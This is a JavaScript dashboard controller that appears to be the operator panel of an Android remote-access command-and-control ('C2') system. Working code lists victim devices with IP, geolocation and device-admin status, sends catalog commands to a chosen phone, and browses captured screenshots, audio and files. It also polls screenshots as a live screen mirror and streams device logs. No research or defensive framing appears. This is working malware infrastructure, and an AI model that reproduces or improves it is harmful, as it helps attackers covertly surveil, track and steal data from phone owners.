/* Main dashboard controller — cyber edition */

(() => {
  const state = {
    devices: [],
    current: null,
    catalog: {},
    socket: null,
    files: [],
    mirrorTimer: null,
    filter: "all",
    search: "",
    view: "list",
    soundOn: false,
    queue: [],
  };

  const $ = sel => document.querySelector(sel);
  const $$ = sel => document.querySelectorAll(sel);

  // ═══════════ BOOT ═══════════
  window.addEventListener("DOMContentLoaded", boot);

  async function boot() {
    GlobeViz.init("globe");
    Terminal.mount();
    wireUI();
    await loadCatalog();
    await refreshDevices();
    connectSocket();
    tickClock();
    setInterval(tickClock, 1000);
    setInterval(refreshDevices, 15000);
    setInterval(flushQueue, 3000);
    C2.activity("🚀", "dashboard started", "info");
  }

  function tickClock() {
    const el = $("#globe-clock");
    if (el) el.textContent = new Date().toLocaleTimeString("en-GB");
  }

  // ═══════════ SOCKET ═══════════
  function connectSocket() {
    const socket = io("/dashboard");
    state.socket = socket;

    socket.on("connect", () => {
      C2.activity("🔌", "socket connected", "success");
      socket.emit("subscribe_global");
    });
    socket.on("disconnect", () => {
      C2.activity("⚠️", "socket disconnected", "warn");
    });
    socket.on("device_update", dev => {
      upsertDevice(dev);
      renderDeviceList();
      renderStats();
      GlobeViz.setDevices(state.devices);
      if (state.current && state.current.id === dev.id) {
        updateCurrentPanel(dev);
      }
    });
    socket.on("command_result", cmd => {
      C2.activity(
        cmd.status === "done" ? "✅" : "❌",
        `${cmd.command_type} ${cmd.status} (#${cmd.id})`,
        cmd.status === "done" ? "success" : "error"
      );
      removeFromQueue(cmd.id);
      if (state.current && cmd.device_id === state.current.id) {
        Terminal.onResult(cmd);
      }
    });
    socket.on("new_file", file => {
      C2.activity("📁", `file: ${file.filename} (${C2.fmtBytes(file.size_bytes)})`, "info");
      if (state.current && file.device_id === state.current.id) {
        loadFiles(state.current.id);
        if (file.category === "screenshot") refreshMirrorOnce();
      }
    });
    socket.on("new_command", cmd => {
      addToQueue(cmd);
    });
    socket.on("log", entry => {
      if (state.current && entry.device_id === state.current.id) {
        appendLog(entry);
      }
    });
  }

  // ═══════════ DATA ═══════════
  async function loadCatalog() {
    state.catalog = await C2.apiJson("/api/catalog");
    renderCatalog();
  }

  async function refreshDevices() {
    const devices = await C2.apiJson("/api/devices");
    state.devices = Array.isArray(devices) ? devices : [];
    renderDeviceList();
    renderStats();
    GlobeViz.setDevices(state.devices);
  }

  function upsertDevice(dev) {
    const idx = state.devices.findIndex(d => d.id === dev.id);
    if (idx >= 0) {
      // detect transition
      const wasOnline = state.devices[idx].is_online;
      const wasWs = state.devices[idx].ws_online;
      state.devices[idx] = dev;
      if (!wasOnline && dev.is_online) {
        C2.activity("🟢", `${dev.model} online`, "success");
      }
      if (wasWs !== dev.ws_online && dev.ws_online) {
        C2.activity("🔌", `${dev.model} WS connected`, "success");
      }
    } else {
      state.devices.unshift(dev);
      C2.activity("➕", `new device: ${dev.model}`, "success");
    }
  }

  // ═══════════ RENDER STATS ═══════════
  function renderStats() {
    const online = state.devices.filter(d => d.is_online).length;
    const ws = state.devices.filter(d => d.ws_online).length;
    $("#stat-online").textContent = online;
    $("#stat-total").textContent = state.devices.length;
    $("#stat-cmds").textContent = state.queue.length;
    $("#stat-files").textContent = ws;
  }

  // ═══════════ RENDER DEVICE LIST ═══════════
  function renderDeviceList() {
    const ul = $("#device-list");
    if (!ul) return;
    const q = state.search.toLowerCase();

    let list = state.devices;

    // filter
    if (state.filter === "online") list = list.filter(d => d.is_online);
    else if (state.filter === "offline") list = list.filter(d => !d.is_online);
    else if (state.filter === "ws") list = list.filter(d => d.ws_online);

    // search
    if (q) {
      list = list.filter(d =>
        (d.model || "").toLowerCase().includes(q) ||
        (d.ip_address || "").includes(q) ||
        (d.hostname || "").toLowerCase().includes(q) ||
        (d.device_id || "").toLowerCase().includes(q) ||
        (d.tags || []).some(t => t.toLowerCase().includes(q))
      );
    }

    $("#sidebar-count").textContent = list.length;
    ul.innerHTML = "";

    if (list.length === 0) {
      const li = document.createElement("li");
      li.style.cssText = "text-align:center;color:var(--muted);cursor:default;border-style:dashed";
      li.innerHTML = `<div style="padding:20px;font-family:var(--mono);font-size:11px">no devices</div>`;
      ul.appendChild(li);
      return;
    }

    list.forEach(d => {
      const li = document.createElement("li");
      const cls = [];
      if (d.is_online) cls.push("online");
      if (d.ws_online) cls.push("ws");
      if (state.current && state.current.id === d.id) cls.push("selected");
      li.className = cls.join(" ");
      li.dataset.id = d.id;

      const tags = (d.tags || []).map(t =>
        `<span class="mini-tag">${C2.escapeHtml(t)}</span>`
      ).join("");

      const batCls = C2.batteryClass(d.battery || 0);
      const wsMini = d.ws_online ? `<span class="ws-mini">WS</span>` : "";

      li.innerHTML = `
        <div class="dev-top">
          <span class="dev-name">${C2.escapeHtml(d.model || "unknown")}</span>
          <span class="dev-status">
            ${wsMini}
            <span class="status-dot"></span>
          </span>
        </div>
        <div class="dev-meta">
          <span>${C2.escapeHtml(d.ip_address || "—")}</span>
          <span class="battery ${batCls}">${d.battery}%</span>
          <span>${C2.escapeHtml(d.android_version || "")}</span>
        </div>
        ${tags ? `<div class="mini-tags">${tags}</div>` : ""}
      `;

      li.addEventListener("click", () => openDevice(d));
      ul.appendChild(li);
    });
  }

  // ═══════════ RENDER CATALOG ═══════════
  function renderCatalog() {
    const wrap = $("#command-catalog");
    if (!wrap) return;
    const q = ($("#cmd-filter")?.value || "").toLowerCase();

    wrap.innerHTML = "";
    Object.entries(state.catalog)
      .filter(([type, info]) => {
        if (!q) return true;
        return type.toLowerCase().includes(q) ||
               (info.desc || "").toLowerCase().includes(q);
      })
      .forEach(([type, info]) => {
        const card = document.createElement("div");
        card.className = "cmd-card";
        card.innerHTML = `
          <div class="name">${C2.escapeHtml(type)}</div>
          <div class="desc">${C2.escapeHtml(info.desc)}</div>
          <div class="args">
            ${(info.args || []).map(a => `<span class="arg">${C2.escapeHtml(a)}</span>`).join("")}
          </div>
        `;
        card.addEventListener("click", () => promptCommand(type, info));
        wrap.appendChild(card);
      });
  }

  async function promptCommand(type, info) {
    if (!state.current) return;
    const args = {};
    for (const argDef of info.args || []) {
      const [name, typ] = argDef.split(":");
      const val = prompt(`القيمة للوسيط "${name}" (${typ || "string"})`, "");
      if (val === null) return;
      if (typ === "int") args[name] = parseInt(val, 10);
      else if (typ === "bool") args[name] = val.toLowerCase() === "true";
      else args[name] = val;
    }
    try {
      const cmd = await C2.apiJson(`/api/device/${state.current.id}/command`, {
        method: "POST",
        body: JSON.stringify({ type, args })
      });
      C2.toast(`queued: ${type}`, "ok");
      C2.activity("⚡", `queued: ${type} (#${cmd.id})`, "info");
      addToQueue(cmd);
      // refresh devices to reflect
      setTimeout(refreshDevices, 500);
    } catch (e) {
      C2.toast(`failed: ${e.message}`, "err");
    }
  }

  // ═══════════ DEVICE PANEL ═══════════
  async function openDevice(dev) {
    state.current = dev;
    $("#device-panel").classList.remove("hidden");
    $("#welcome").classList.add("hidden");
    renderDeviceList();  // refresh selection

    updateCurrentPanel(dev);
    renderOverview(dev);

    Terminal.setDevice(dev.id);
    Terminal.write(`[session] attached to device #${dev.id}`, "in");

    if (dev.latitude && dev.longitude) GlobeViz.focusOn(dev.latitude, dev.longitude);
    state.socket.emit("subscribe", { device_id: dev.id });

    await loadFiles(dev.id);
    await loadLogs(dev.id);
    refreshMirrorOnce();
    $("#notes-area").value = dev.notes || "";
    $("#tag-input").value = (dev.tags || []).join(", ");

    C2.activity("👁", `opened device: ${dev.model}`, "info");
  }

  function updateCurrentPanel(dev) {
    $("#dev-title").textContent = dev.model || dev.device_id;
    $("#dev-ip").textContent = dev.ip_address || "—";
    $("#dev-model").textContent = dev.manufacturer
      ? `${dev.manufacturer} ${dev.model}`
      : dev.model || "—";
    $("#dev-android").textContent = `Android ${dev.android_version || "?"} (SDK ${dev.sdk_int || "?"})`;
    $("#dev-battery").textContent = `${dev.battery}%${dev.is_charging ? " ⚡" : ""}`;
    $("#dev-admin").style.display = dev.is_admin ? "inline-block" : "none";

    const badge = $("#dev-ws-badge");
    if (dev.ws_online) {
      badge.textContent = "🟢 WS connected";
      badge.className = "ws-badge online";
    } else {
      badge.textContent = "⚪ HTTP only";
      badge.className = "ws-badge";
    }

    // tags
    const row = $("#dev-tags");
    row.innerHTML = (dev.tags || [])
      .map(t => `<span class="big-tag">${C2.escapeHtml(t)}</span>`).join("");

    renderOverview(dev);
  }

  function renderOverview(dev) {
    const grid = $("#overview-grid");
    if (!grid) return;

    const bat = dev.battery || 0;
    const batCls = C2.batteryClass(bat);

    const cards = [
      {
        label: "Device ID",
        value: (dev.device_id || "").slice(0, 12) + "…",
        sub: dev.device_id,
      },
      {
        label: "Hostname",
        value: dev.hostname || "—",
      },
      {
        label: "Manufacturer",
        value: dev.manufacturer || "—",
      },
      {
        label: "Android",
        value: dev.android_version || "—",
        sub: `SDK ${dev.sdk_int || "?"}`,
      },
      {
        label: "Battery",
        value: `${bat}%`,
        sub: dev.is_charging ? "charging" : "discharging",
      },
      {
        label: "IP",
        value: dev.ip_address || "—",
      },
      {
        label: "Location",
        value: dev.city
          ? `${dev.city}, ${dev.country || ""}`
          : (dev.latitude && dev.longitude ? `${dev.latitude.toFixed(3)}, ${dev.longitude.toFixed(3)}` : "—"),
      },
      {
        label: "Status",
        value: dev.ws_online ? "🟢 WS" : (dev.is_online ? "🟡 HTTP" : "⚪ offline"),
        sub: `last: ${C2.fmtRelative(dev.last_seen)}`,
      },
    ];

    grid.innerHTML = cards.map(c => `
      <div class="ov-card">
        <div class="ov-label">${C2.escapeHtml(c.label)}</div>
        <div class="ov-value">${C2.escapeHtml(c.value)}</div>
        ${c.sub ? `<div class="ov-sub">${C2.escapeHtml(c.sub)}</div>` : ""}
      </div>
    `).join("");
  }

  // ═══════════ FILES ═══════════
  async function loadFiles(devId) {
    state.files = await C2.apiJson(`/api/device/${devId}/files`);
    renderFiles();
  }

  function renderFiles() {
    const grid = $("#file-grid");
    if (!grid) return;
    const filter = $("#file-filter")?.value || "";
    const files = filter ? state.files.filter(f => f.category === filter) : state.files;

    $("#file-count").textContent = `${files.length} files`;
    grid.innerHTML = "";

    files.forEach(f => {
      const card = document.createElement("div");
      card.className = "file-card";

      const mime = f.mime_type || "";
      const isImg = mime.startsWith("image/");
      const isVid = mime.startsWith("video/");
      const isAud = mime.startsWith("audio/");

      let preview;
      if (isImg) preview = `<img src="/api/file/${f.id}/raw" loading="lazy">`;
      else if (isVid) preview = `<video src="/api/file/${f.id}/raw" muted></video>`;
      else if (isAud) preview = `<span class="file-glyph">🎙</span>`;
      else preview = `<span class="file-glyph">📄</span>`;

      card.innerHTML = `
        <div class="preview">${preview}</div>
        <div class="info">
          <span class="fn">${C2.escapeHtml(f.filename)}</span>
          <span>${f.category} · ${C2.fmtBytes(f.size_bytes)}</span>
          <span class="hash">${(f.sha256 || "").slice(0, 12)}</span>
        </div>
        <div class="file-actions">
          <button class="btn-view">view</button>
          <button class="btn-dl">download</button>
        </div>
      `;

      card.addEventListener("click", (ev) => {
        if (ev.target.classList.contains("btn-dl")) {
          window.open(`/api/file/${f.id}/download`, "_blank");
        } else {
          openFileViewer(f);
        }
      });
      grid.appendChild(card);
    });
  }

  function openFileViewer(f) {
    const mime = f.mime_type || "";
    const isImg = mime.startsWith("image/");
    const isVid = mime.startsWith("video/");
    const isAud = mime.startsWith("audio/");
    const isTxt = mime.startsWith("text/") ||
      /\.(log|txt|json|csv|xml|md)$/i.test(f.filename);

    let body;
    if (isImg) body = `<img class="viewer-media" src="/api/file/${f.id}/raw">`;
    else if (isVid) body = `<video class="viewer-media" controls src="/api/file/${f.id}/raw"></video>`;
    else if (isAud) body = `<audio class="viewer-media" controls src="/api/file/${f.id}/raw"></audio>`;
    else if (isTxt) body = `<pre class="viewer-text" id="viewer-text">loading…</pre>`;
    else body = `<div class="viewer-binary">binary preview unavailable</div>`;

    C2.openModal(`
      <div class="modal-head">
        <div>
          <div class="modal-title">${C2.escapeHtml(f.filename)}</div>
          <div class="modal-sub">${f.category} · ${C2.fmtBytes(f.size_bytes)} · ${C2.escapeHtml(mime)}</div>
        </div>
        <button class="modal-close" onclick="C2.closeModal()">✕</button>
      </div>
      <div class="modal-body">${body}</div>
      <div class="modal-foot">
        <a href="/api/file/${f.id}/download" download>download</a>
      </div>
    `);

    if (isTxt) {
      fetch(`/api/file/${f.id}/raw`)
        .then(r => r.text())
        .then(t => {
          const el = document.getElementById("viewer-text");
          if (el) el.textContent = t.slice(0, 200000);
        })
        .catch(() => {});
    }
  }

  // ═══════════ LOGS ═══════════
  async function loadLogs(devId) {
    const logs = await C2.apiJson(`/api/device/${devId}/logs`);
    const box = $("#log-stream");
    if (!box) return;
    box.innerHTML = "";
    logs.slice().reverse().forEach(appendLog);
  }

  function appendLog(entry) {
    const box = $("#log-stream");
    if (!box) return;
    const row = document.createElement("div");
    row.className = `log-row ${entry.level}`;
    row.innerHTML = `
      <span class="time">${new Date(entry.created_at).toLocaleTimeString()}</span>
      <span class="level">${entry.level}</span>
      <span class="msg">${C2.escapeHtml(entry.message)}</span>
    `;
    box.appendChild(row);
    box.scrollTop = box.scrollHeight;
  }

  // ═══════════ MIRROR ═══════════
  function refreshMirrorOnce() {
    if (!state.current) return;
    const img = $("#mirror-img");
    if (!img) return;
    img.src = `/api/device/${state.current.id}/latest-screenshot?ts=${Date.now()}`;
    img.onerror = () => { img.removeAttribute("src"); };
  }

  function toggleMirror() {
    const btn = $("#mirror-stream-toggle");
    if (!btn) return;
    if (state.mirrorTimer) {
      clearInterval(state.mirrorTimer);
      state.mirrorTimer = null;
      btn.textContent = "start live";
      $("#mirror-fps").textContent = "idle";
      return;
    }
    btn.textContent = "stop live";
    $("#mirror-fps").textContent = "polling 0.5 fps";
    state.mirrorTimer = setInterval(() => {
      if (state.current) refreshMirrorOnce();
    }, 2000);
  }

  // ═══════════ QUEUE ═══════════
  function addToQueue(cmd) {
    state.queue.push(cmd);
    if (state.queue.length > 50) state.queue.shift();
    renderQueue();
    renderStats();
  }

  function removeFromQueue(cmdId) {
    state.queue = state.queue.filter(c => c.id !== cmdId);
    renderQueue();
    renderStats();
  }

  function renderQueue() {
    const box = $("#queue-feed");
    if (!box) return;
    if (state.queue.length === 0) {
      box.innerHTML = `<div class="empty-note">queue is empty</div>`;
      return;
    }
    box.innerHTML = state.queue.slice(-8).reverse().map(c => {
      const icon = c.status === "done" ? "✅" :
                   c.status === "failed" ? "❌" :
                   c.status === "sent" ? "📤" : "⏳";
      return `
        <div class="queue-item ${c.status}">
          <span class="q-icon">${icon}</span>
          <span class="q-type">${C2.escapeHtml(c.command_type)}</span>
          <span class="q-status">#${c.id}</span>
        </div>
      `;
    }).join("");
  }

  async function flushQueue() {
    // remove items that are older than 2 minutes and not pending
    const now = Date.now();
    state.queue = state.queue.filter(c => {
      if (c.status === "pending" || c.status === "sent") {
        // keep for 60s
        const age = now - new Date(c.created_at).getTime();
        return age < 60000;
      }
      return true;
    });
    renderQueue();
    renderStats();
  }

  // ═══════════ UI WIRING ═══════════
  function wireUI() {
    const search = $("#global-search");
    if (search) {
      search.addEventListener("input", () => {
        state.search = search.value;
        renderDeviceList();
      });
    }

    $$(".filter-chip").forEach(btn => {
      btn.addEventListener("click", () => {
        $$(".filter-chip").forEach(b => b.classList.remove("active"));
        btn.classList.add("active");
        state.filter = btn.dataset.filter || "all";
        renderDeviceList();
      });
    });

    const cmdFilter = $("#cmd-filter");
    if (cmdFilter) cmdFilter.addEventListener("input", renderCatalog);

    const devClose = $("#dev-close");
    if (devClose) devClose.addEventListener("click", () => {
      if (state.current && state.socket) {
        state.socket.emit("unsubscribe", { device_id: state.current.id });
      }
      if (state.mirrorTimer) {
        clearInterval(state.mirrorTimer);
        state.mirrorTimer = null;
      }
      $("#device-panel").classList.add("hidden");
      $("#welcome").classList.remove("hidden");
      state.current = null;
      renderDeviceList();
    });

    $$(".tabs button").forEach(btn => {
      btn.addEventListener("click", () => {
        $$(".tabs button").forEach(b => b.classList.remove("active"));
        $$(".tab-panel").forEach(p => p.classList.remove("active"));
        btn.classList.add("active");
        const panel = document.querySelector(`[data-panel="${btn.dataset.tab}"]`);
        if (panel) panel.classList.add("active");
      });
    });

    const notesSave = $("#notes-save");
    if (notesSave) notesSave.addEventListener("click", async () => {
      if (!state.current) return;
      await C2.apiJson(`/api/device/${state.current.id}/notes`, {
        method: "POST",
        body: JSON.stringify({ notes: $("#notes-area").value })
      });
      C2.toast("notes saved", "ok");
    });

    const tagsSave = $("#tags-save");
    if (tagsSave) tagsSave.addEventListener("click", async () => {
      if (!state.current) return;
      const tags = $("#tag-input").value.split(",").map(t => t.trim()).filter(Boolean);
      const dev = await C2.apiJson(`/api/device/${state.current.id}/tags`, {
        method: "POST",
        body: JSON.stringify({ tags })
      });
      state.current = dev;
      updateCurrentPanel(dev);
      renderDeviceList();
      C2.toast("tags saved", "ok");
    });

    const fileFilter = $("#file-filter");
    if (fileFilter) fileFilter.addEventListener("change", renderFiles);

    const mirrorRefresh = $("#mirror-refresh");
    if (mirrorRefresh) mirrorRefresh.addEventListener("click", refreshMirrorOnce);

    const mirrorToggle = $("#mirror-stream-toggle");
    if (mirrorToggle) mirrorToggle.addEventListener("click", toggleMirror);

    const viewToggle = $("#btn-view-toggle");
    if (viewToggle) viewToggle.addEventListener("click", () => {
      state.view = state.view === "list" ? "grid" : "list";
      C2.toast(`view: ${state.view}`, "info");
    });

    const soundToggle = $("#btn-sound");
    if (soundToggle) soundToggle.addEventListener("click", () => {
      state.soundOn = !state.soundOn;
      soundToggle.classList.toggle("active", state.soundOn);
      C2.toast(`sound: ${state.soundOn ? "on" : "off"}`, "info");
    });

    // keyboard shortcuts
    document.addEventListener("keydown", (e) => {
      if (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA") return;
      if (e.key === "Escape") {
        C2.closeModal();
        if (state.current) {
          $("#dev-close")?.click();
        }
      }
      if (e.key === "/" && !e.metaKey && !e.ctrlKey) {
        e.preventDefault();
        $("#global-search")?.focus();
      }
    });
  }

})();
